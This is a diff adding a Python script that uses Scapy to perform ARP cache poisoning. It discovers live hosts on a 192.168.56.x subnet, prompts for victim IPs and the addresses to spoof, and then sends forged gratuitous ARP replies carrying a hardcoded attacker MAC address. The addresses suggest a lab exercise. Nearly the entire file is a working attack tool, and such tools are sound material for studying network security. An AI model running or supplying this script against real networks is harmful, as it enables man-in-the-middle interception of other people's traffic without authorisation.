@@ -1,0 +1,67 @@
+from scapy.all import * 
+
+
+def spoofedPkt(macVictim, ipVictim, ipToSpoof):
+    arp= Ether() / ARP()
+    arp[Ether].src = macAttacker
+    arp[ARP].hwsrc = macAttacker        
+    arp[ARP].psrc = ipToSpoof            
+    arp[ARP].hwdst = macVictim
+    arp[ARP].pdst = ipVictim           
+
+    sendp(arp, loop = 0, iface="enp0s3") # inter -> 60 sec to wait between 2 pkts
+
+def gratutiousARP(macVictim, ipVictim, ipToSpoof):
+    #arp response that was not prompt by arp request
+    arp= Ether() / ARP()
+    arp[Ether].src = macAttacker
+    arp[ARP].hwsrc = macAttacker        
+    arp[ARP].psrc = ipToSpoof            
+    arp[ARP].hwdst = macVictim
+    arp[ARP].pdst = ipVictim 
+    arp[ARP].op = "is-at"
+    
+    sendp(arp, loop = 0, iface="enp0s3") # inter -> 60 sec to wait between 2 pkts
+    
+
+#ping all host with IPs between 192.168.56.99-103
+#hosts = sr(IP(dst = "192.168.56.100/30")/ICMP(), timeout=2) 
+
+hosts = arping("192.168.56.100/30") #checks which IPs in the range: 192.168.56.100-108 are up
+dictIPMAC = {}
+for i in range(len(hosts[0])): #hosts[0] contains the answers form the hosts that are up
+    dictIPMAC[hosts[0][i][1][ARP].psrc] = hosts[0][i][1][ARP].hwsrc
+    print("Host ", hosts[0][i][1][ARP].psrc, "is up")
+
+print("How many hosts arp tables do you want to spoof: ")
+inputNumber = int(input())
+
+ipVictims = []
+ipsToBeSpoofed = []
+for i in range(inputNumber):
+    print("Insert the IP of victim ", i, " (Press Enter)")
+    ipVictim = raw_input()    
+    ipVictims.append(ipVictim)
+    print("Insert the IP that will be spoofed in victims arp table")
+    ipToBeSpoof = raw_input()
+    ipsToBeSpoofed.append(ipToBeSpoof)
+
+print("You want to poision the arp tables of ", ipVictims)
+
+
+macAttacker = "08:00:27:D0:25:4B"            
+ipAttacker = "192.168.56.103"
+
+for i in range(len(ipVictims)):
+    macVictim = dictIPMAC[ipVictims[i]]
+    ipVictim = ipVictims[i]
+    ipToSpoof = ipsToBeSpoofed[i]
+    #spoofedPkt(macVictim, ipVictim, ipToSpoof)
+    gratutiousARP(macVictim, ipVictim, ipToSpoof)
+
+
+
+
+
+
+
